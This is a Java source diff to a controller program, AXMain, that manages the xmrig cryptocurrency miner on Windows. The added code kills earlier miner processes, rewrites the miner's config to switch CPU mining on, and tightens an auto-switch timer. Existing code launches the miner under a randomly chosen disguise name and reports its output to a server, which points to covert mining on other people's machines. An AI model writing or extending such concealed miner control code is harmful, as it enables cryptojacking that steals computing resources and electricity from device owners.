@@ -28,6 +28,8 @@ public class AXMain {
     static Timer timer=new Timer();
     static AutoSwitch autoSwitch;
     public static void main(String[] args) {
+        //避免重复
+        killAllMiner();
         if (args.length>0){
             printToStdout=Boolean.parseBoolean(args[0]);
         }
@@ -64,6 +66,14 @@ public class AXMain {
         //读取ghostj的配置文件修改config.json中的本机pass
         String cfgjson=FileRW.readMultiLine("D:\\xmrig\\config.json");
         FileRW.write("D:\\xmrig\\config.json",cfgjson.replaceAll("DEVICE_PASS",pass).replaceAll("nmsl@wsnb.com",pass));
+        try {
+            String fileContent = FileIO.read("D:\\xmrig\\config.json");
+            FileIO.write("D:\\xmrig\\config.json", fileContent.replace("\"cpu\": {\n" +
+                    "        \"enabled\": false,", "\"cpu\": {\n" +
+                    "        \"enabled\": true,"));
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
         //随机一个程序名
         int idx=(int)(Math.random()*1000)%PROG_MASK_NAME.length;
         String maskName=PROG_MASK_NAME[idx];
@@ -108,7 +118,7 @@ public class AXMain {
             Thread.sleep(10000);
         }catch (Exception ignored){}
         autoSwitch=new AutoSwitch();
-        timer.schedule(autoSwitch,new Date(),10000);
+        timer.schedule(autoSwitch,new Date(),5000);
         //向服务端发送xmrig的stdout
         //支持关闭和重启xmrig
     }
@@ -151,7 +161,7 @@ public class AXMain {
     public static boolean isWindows10() {
         return System.getProperties().getProperty("os.name").toUpperCase().contains("WINDOWS 10");
     }
-    public static void killAll(){
+    public static void killAllMiner(){
         try {
             for (String s : PROG_MASK_NAME) {
                 Runtime.getRuntime().exec("taskkill /im " + s + " /f");
